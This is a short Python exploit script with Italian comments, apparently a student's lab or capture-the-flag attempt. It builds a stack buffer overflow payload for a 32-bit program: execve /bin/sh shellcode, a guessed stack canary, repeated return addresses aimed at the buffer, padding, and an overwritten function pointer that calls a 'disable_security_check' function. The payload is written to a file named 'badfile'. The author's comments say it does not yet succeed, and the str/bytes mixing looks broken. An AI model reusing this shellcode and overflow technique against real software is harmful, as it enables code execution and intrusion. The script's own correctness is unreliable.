#NOTA: NON ESCE CHE HO VINTO

import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#find gadgets (?)
#l'indirizzo delle funzioni si trova tramite gdb scrivendo "print nome_funzione"
disable_security_check = 0x804852b #trovato con peda
return_buffer = 0xbfb8959c #ovvero dst, dove andiamo a scrivere il nostro injection vector
canary = 0x41414141 #non sono convinta

#pointer overwriting
print(len(shellcode))

payload = shellcode
canary_distance = 108 - len(shellcode) #108 si calcola con peda: e` la distanza tra la strcpy e il ret address della funzione print function --> ma perche` 108
payload += struct.pack("I", canary)*((canary_distance/4)) #replico il canary fino ad arrivare a canary_distance
payload += struct.pack("I", return_buffer)
payload += struct.pack("I", return_buffer)
payload += struct.pack("I", return_buffer) #--> tre ret address = 12 per sicurezza, return e` dove ho messo lo shellcode ??
#--> il blocco qui sopra serve per coprire la seconda parte dell'exploit

payload += "B"*(263-len(shellcode)-canary_distance-12) #il 263 e` per l'altro buffer, quello in main, str di cui ora ho scritto solo un centinaio di caratteri --> devo fare overflow prima qui per poi entrare in fp (il rimanente lo riempio di B)
payload += struct.pack("I", disable_security_check) #alla fine metto l'indirizzo della funzione che devo invocare

f = open("badfile", "a")
f.write("%s" % payload)
f.close()


